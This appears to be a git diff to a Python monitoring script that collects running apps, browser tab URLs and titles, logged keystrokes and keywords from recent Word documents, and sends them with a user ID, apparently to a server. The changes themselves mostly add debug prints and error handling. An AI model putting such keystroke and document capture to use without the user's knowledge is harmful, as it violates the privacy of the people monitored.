@@ -86,6 +86,7 @@ def get_running_apps():
         apps.remove('Setup/Uninstall')
     except:
         pass
+    print("apps")
     print(apps)
     apps = '#'.join(apps)
     buffer = get_buffer(f"new_apps:{user_id}:{apps}")
@@ -109,8 +110,15 @@ def get_tabs():
             websites.append(tab[1])
             visited_websites.append(tab[1])
     
-    websites = [f"{url}  {get_website_title(url)}" for url in websites]
-    print(websites)
+    # print(websites)
+    web_list = []
+    for url in websites:
+        title = get_website_title(url)
+        if title:
+            web_list.append(f"{url} {title}")
+            
+    print("websites")
+    print(web_list)
     websites = ';'.join(websites)
 
     if websites:
@@ -125,8 +133,10 @@ def get_website_title(url):
     
     # using the BeautifulSoup module
     soup = BeautifulSoup(reqs.text, 'html.parser')
-    
-    return soup.find_all('title')[0].get_text()
+    try:    
+        return soup.find_all('title')[0].get_text()
+    except:
+        return None
 
 
 def type_trace():
@@ -137,6 +147,7 @@ def type_trace():
         all_keys = ''.join(all_keys)
         all_keys = all_keys.replace('space', ' ')
         all_keys = all_keys.replace('shift', '')
+        print("Typed text")
         print(all_keys)
 
         if all_keys != '':
@@ -164,7 +175,7 @@ def get_word_docs():
     new_docs = []
 
     # Print the list of Word documents and their modified dates
-    time_threshold = datetime.datetime.now() - datetime.timedelta(days=1)  # 7 days
+    time_threshold = datetime.datetime.now() - datetime.timedelta(days=1)  # 1 day
     for document, modified_time in documents:
         if modified_time > time_threshold:
             new_docs.append(document)
@@ -201,6 +212,7 @@ def get_word_text(doc):
     r = Rake()
     r.extract_keywords_from_text(new_text)
     new_words = ' '.join(r.get_ranked_phrases())
+    print("Word doc")
     print(new_words)
 
     buffer = get_buffer(f"new_text*{user_id}*{new_words}")
@@ -242,6 +254,7 @@ def start_server_conn():
 
 if __name__ == '__main__': 
     start_server_conn()
+
     # get_tabs()
     # get_word_docs()
     # get_running_apps()
